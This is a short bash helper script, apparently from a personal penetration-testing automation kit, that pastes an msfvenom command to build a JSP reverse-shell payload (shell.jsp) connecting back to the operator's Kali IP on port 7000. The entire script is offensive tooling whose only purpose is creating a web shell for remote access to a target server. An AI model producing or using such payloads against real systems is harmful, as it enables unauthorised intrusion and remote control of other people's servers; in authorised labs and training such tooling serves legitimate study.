#!/bin/bash

: '
Create JSP file
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

paste_command "msfvenom -p java/jsp_shell_reverse_tcp LHOST=${KALI_IP} LPORT=7000 -f raw -o shell.jsp"
